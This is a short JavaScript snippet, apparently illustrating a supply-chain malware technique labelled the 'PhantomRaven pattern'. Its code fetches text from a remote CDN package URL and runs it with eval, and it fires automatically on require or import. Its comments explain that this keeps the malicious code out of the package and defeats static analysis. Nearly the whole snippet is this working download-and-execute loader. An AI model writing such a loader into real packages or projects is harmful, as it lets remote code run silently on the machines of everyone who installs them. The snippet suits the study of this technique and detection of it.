// PhantomRaven pattern: zero dependencies, payload fetched at runtime
// No require('child_process'), no require('fs'), no import — just fetch + eval

async function initialize() {
  // Fetch remote configuration (actually malicious payload)
  const response = await fetch('https://cdn.jsdelivr.net/npm/@config-loader/runtime/config.js');
  const payload = await response.text();

  // Execute fetched code — the real malware lives on the remote server
  // This makes static analysis nearly impossible: the malicious code is never in the package
  eval(payload);
}

// Auto-execute on require/import
initialize();
